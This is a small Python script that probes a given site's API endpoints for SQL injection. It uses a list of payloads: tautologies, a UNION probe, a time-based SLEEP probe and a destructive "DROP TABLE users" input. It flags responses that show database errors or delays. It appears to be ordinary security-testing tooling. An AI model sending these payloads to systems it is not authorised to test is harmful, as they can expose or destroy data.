#!/usr/bin/env python3
"""
test_sqli.py - SQL Injection Testing Script
Usage: python test_sqli.py <target_url>
"""

import sys
import requests
from urllib.parse import urljoin

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "1' OR '1'='1",
    "1 OR 1=1",
    "' UNION SELECT NULL--",
    "'; DROP TABLE users--",
    "1' AND SLEEP(5)--",
]

def test_sqli(base_url):
    print(f"=== SQL Injection Test ===")
    print(f"Target: {base_url}\n")
    
    vulnerable = []
    test_endpoints = ["/api/data?id={}", "/api/user?id={}", "/api/search?q={}"]
    
    for endpoint in test_endpoints:
        for payload in SQLI_PAYLOADS:
            url = urljoin(base_url, endpoint.format(payload))
            try:
                resp = requests.get(url, timeout=10)
                error_indicators = ["sql", "syntax", "mysql", "postgresql", "sqlite"]
                
                if any(err in resp.text.lower() for err in error_indicators):
                    print(f"[!] Potential SQLi: {endpoint}")
                    print(f"    Payload: {payload}")
                    vulnerable.append((endpoint, payload))
                    break
                    
                if resp.elapsed.total_seconds() > 5:
                    print(f"[!] Potential time-based SQLi: {endpoint}")
                    vulnerable.append((endpoint, payload))
                    
            except requests.exceptions.Timeout:
                print(f"[!] Timeout (possible time-based SQLi): {endpoint}")
                vulnerable.append((endpoint, payload))
            except requests.exceptions.RequestException:
                pass
    
    print(f"\n=== Results ===")
    if vulnerable:
        print(f"[WARNING] Found {len(vulnerable)} potential SQL injection points.")
    else:
        print("[OK] No obvious SQL injection vulnerabilities detected.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        sys.exit(1)
    test_sqli(sys.argv[1])
